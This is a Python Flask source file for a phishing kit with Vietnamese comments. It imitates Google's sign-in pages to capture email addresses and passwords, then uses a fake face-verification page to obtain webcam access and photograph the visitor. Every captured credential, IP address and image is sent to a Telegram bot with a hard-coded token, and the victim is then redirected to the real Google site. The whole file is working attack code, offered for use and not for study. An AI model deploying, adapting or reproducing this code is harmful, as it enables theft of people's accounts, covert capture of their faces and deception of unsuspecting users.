# app.py
# Python 3.10+
# Target: Google Phishing Page (Bắt Email, Pass + Chụp ảnh Webcam)
# Requires: flask, requests

from flask import Flask, request, render_template_string, redirect
import requests
import os
import base64

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9050498708:AAG9AVoffgweODY06PWGLwNBRHXvoaN9B4s")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "9144223149")

# HTML Chung (CSS dùng cho các trang)
CSS = """
<style>
    body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
    .logo { width: 75px; margin-bottom: 16px; }
    h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
    p { font-size: 16px; margin-bottom: 30px; color: #5f6368;}
    input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; margin-bottom: 10px; }
    .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; float: right; cursor: pointer; }
    .btn-next:hover { background: #1557b0; }
    .clear { clear: both; }
    .hidden { display: none; }
</style>
"""

# BƯỚC 1: NHẬP EMAIL
HTML_LOGIN_EMAIL = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
<body>
    <div class="login-box">
        <h1>Đăng nhập</h1>
        <p>Sử dụng Tài khoản Google của bạn</p>
        <form method="POST" action="/login">
            <input type="email" name="username" placeholder="Email hoặc số điện thoại" required>
            <button type="submit" class="btn-next">Tiếp theo</button><div class="clear"></div>
        </form>
    </div>
</body></html>
"""

# BƯỚC 2: NHẬP MẬT KHẨU
HTML_LOGIN_PASS = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
<body>
    <div class="login-box">
        <h1>Chào mừng</h1>
        <p id="email-display" style="font-weight: 500;"></p>
        <form method="POST" action="/verify_pass">
            <input type="password" name="password" placeholder="Nhập mật khẩu của bạn" required>
            <button type="submit" class="btn-next">Đăng nhập</button><div class="clear"></div>
        </form>
    </div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        if(email) document.getElementById('email-display').innerText = email;
    </script>
</body></html>
"""

# BƯỚC 3: LỪA CẤP QUYỀN CAMERA
HTML_CAMERA_SCAM = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Xác minh danh tính</title>{CSS}
<style>
    #video { width: 100%; border-radius: 8px; display: none; margin-bottom: 15px; }
    .notice {{ font-size: 13px; color: #d93025; margin-top: 15px; }}
</style>
</head>
<body>
    <div class="login-box">
        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <h1>Xác minh danh tính</h1>
        <p>Để đảm bảo tài khoản của bạn không bị xâm nhập, Google yêu cầu xác minh khuôn mặt qua Webcam.</p>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" class="hidden"></canvas>
        
        <button id="verifyBtn" class="btn-next" style="width: 100%; float: none;">Bật Camera & Xác minh</button>
        <div class="notice" id="status"></div>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('verifyBtn');
        const status = document.getElementById('status');

        btn.addEventListener('click', async () => {{
            status.innerText = "Đang yêu cầu quyền truy cập...";
            try {{
                // Xin quyền Camera và Mic
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                video.srcObject = stream;
                video.style.display = 'block';
                btn.style.display = 'none';
                status.innerText = "Vui lòng nhìn thẳng vào Camera...";
                
                // Đợi 2 giây cho cam lấy nét rồi chụp
                setTimeout(() => {{
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Lấy dữ liệu ảnh dạng Base64
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Gửi về server
                    fetch('/upload_face', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ image: imageData, email: new URLSearchParams(window.location.search).get('email') }})
                    }}).then(() => {{
                        status.innerText = "Xác minh thành công! Đang chuyển hướng...";
                        status.style.color = "green";
                        setTimeout(() => window.location.href = "https://accounts.google.com", 1000);
                    }});
                    
                    // Tắt cam
                    stream.getTracks().forEach(track => track.stop());
                }}, 2000);

            }} catch (err) {{
                status.innerText = "Lỗi: Bạn cần cấp quyền Camera để tiếp tục!";
            }}
        }});
    </script>
</body></html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_LOGIN_EMAIL)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    send_telegram(f"📧 **BẮT ĐƯỢC EMAIL!**\nIP: `{request.remote_addr}`\nEmail: `{username}`")
    return redirect(f"/password?email={username}")

@app.route('/password')
def password_page():
    return render_template_string(HTML_LOGIN_PASS)

@app.route('/verify_pass', methods=['POST'])
def verify_pass():
    password = request.form.get('password')
    email = request.referrer.split('email=')[-1] if 'email=' in request.referer else "Unknown"
    send_telegram(f"🔑 **BẮT ĐƯỢC PASSWORD!**\nIP: `{request.remote_addr}`\nEmail: `{email}`\nPass: `{password}`")
    
    # Dẫn dụ nạn nhân sang trang xin quyền cam
    return redirect(f"/verify?email={email}")

@app.route('/verify')
def verify_page():
    return render_template_string(HTML_CAMERA_SCAM)

@app.route('/upload_face', methods=['POST'])
def upload_face():
    data = request.json
    email = data.get('email', 'Unknown')
    image_data = data.get('image')

    if image_data:
        # Cắt bỏ tiền tố "data:image/jpeg;base64," để giải mã
        img_bytes = base64.b64decode(image_data.split(',')[1])
        
        # Gửi ảnh qua Telegram
        send_telegram_photo(img_bytes, email)
        
    return "OK"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"[!] Lỗi gửi Telegram: {e}")

def send_telegram_photo(image_bytes, email):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    files = {'photo': ('face.jpg', image_bytes, 'image/jpeg')}
    payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": f"📸 ẢNH WEBCAM CỦA NẠN NHÂN!\nEmail: {email}"}
    try:
        requests.post(url, data=payload, files=files, timeout=10)
    except Exception as e:
        print(f"[!] Lỗi gửi ảnh Telegram: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
